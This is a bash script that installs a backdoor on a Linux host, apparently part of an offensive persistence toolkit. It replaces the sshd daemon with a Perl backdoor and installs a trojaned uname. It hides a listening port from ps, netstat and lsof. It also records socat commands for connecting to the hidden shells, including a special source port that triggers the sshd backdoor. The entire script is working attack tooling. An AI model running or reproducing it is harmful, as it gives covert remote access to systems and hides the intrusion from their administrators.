#!/bin/bash

#Add this to the scipts that need to include this file
#Includes
DIR="${BASH_SOURCE%/*}"
if [[ ! -d "$DIR" ]]; then DIR="$PWD"; fi
. "$DIR/../include.sh"

#Options
SCRIPT_DIR=$(cd $(dirname "${BASH_SOURCE[0]}") && pwd)
port="54321"
mfiles=("/usr/local/bin/ps" "/usr/local/bin/netstat" "/usr/local/bin/lsof" "/usr/local/bin/uname")

#Main
#Check if root
rootcheck

#Install netstat
allcheck 0 "Installing net-tools" yum install net-tools socat -y

#Backup
mkdir bd_backups
cp /usr/bin/uname /usr/sbin/sshd /usr/bin/netstat /usr/bin/ps /usr/sbin/lsof ./bd_backups

#Run the bd scripts
allcheck 0 "Installing bd_uname script" cp -v ./bd_uname.sh /usr/local/bin/uname
info 0 "Installing bd_sshd script" 
mv -v /usr/sbin/sshd /usr/bin 
cp -v ./bd_sshd.pl /usr/sbin/sshd
systemctl restart sshd
ifcheck "installing bd_sshd script"
echo ""

#Hiding port from lsof netstat and ps
allcheck 0 "Hiding port from lsof netstat and ps" ./bd_hide.sh

#Configure bd scripts
info 0 "Configuring bd scripts"
for x in ${mfiles[@]}; do sed -i "s/<PORT>/$port/g" $x; done
ifcheck "configuring bd scripts"
echo ""

#Inform repfile
echo "#DO NOT DELETE" >> $repfile
echo "Added: /usr/local/bin/ps" >> $repfile
echo "Added: /usr/local/bin/netstat" >> $repfile
echo "Added: /usr/local/bin/lsof" >> $repfile
echo "Added: /usr/local/bin/uname" >> $repfile
echo "Replace: /usr/sbin/sshd and moved original to /usr/bin/" >> $repfile
echo "CMD for uname: socat STDIO TCP4:<IP>:$port" >> $repfile
echo "CMD for sshd: socat STDIO TCP4:<IP>:22,sourceport=19526" >> $repfile

#Run backdoor
cd /
uname > /dev/null
cd -

